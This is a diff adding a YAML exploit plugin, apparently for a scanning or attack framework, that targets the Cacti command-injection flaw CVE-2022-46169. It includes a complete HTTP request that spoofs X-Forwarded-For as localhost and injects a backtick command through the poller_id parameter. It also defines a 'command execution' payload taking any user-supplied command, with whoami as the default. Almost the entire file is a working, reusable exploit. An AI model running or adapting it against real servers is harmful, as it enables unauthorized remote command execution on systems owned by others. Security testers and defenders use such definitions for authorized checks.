@@ -1,0 +1,35 @@
+info:
+    app: Cacti
+    name: CVE-2022-46169
+    author: 小晨曦
+    plugin_version: 1.0.0
+    disclosure_date: "2022-12-05"
+    create_date: "2024-10-08 10:22:11"
+    update_date: "2024-10-08 10:22:11"
+    scope: 1.2.17-1.2.22
+    description: Cacti是一个服务器监控与管理平台。在其1.2.17-1.2.22版本中存在一处命令注入漏洞，攻击者可以通过X-Forwarded-For请求头绕过服务端校验并在其中执行任意命令。
+    vul_id: CVE-2022-46169
+    detail: 参考 https://github.com/0xf4n9x/CVE-2022-46169 获取host_id和local_data_ids
+    payload: |-
+        GET /remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=`touch+/tmp/success` HTTP/1.1
+        X-Forwarded-For: 127.0.0.1
+    reference: https://github.com/vulhub/vulhub/blob/master/cacti/CVE-2022-46169/README.zh-cn.md
+payloads:
+    - name: cmd1
+      alias: 命令执行
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: whoami
+            required: true
+          - key: local_data_ids
+            title: local_data_ids
+            param_type: edit
+            default_value: "6"
+            required: true
+          - key: host_id
+            title: host_id
+            param_type: edit
+            default_value: "1"
+            required: true
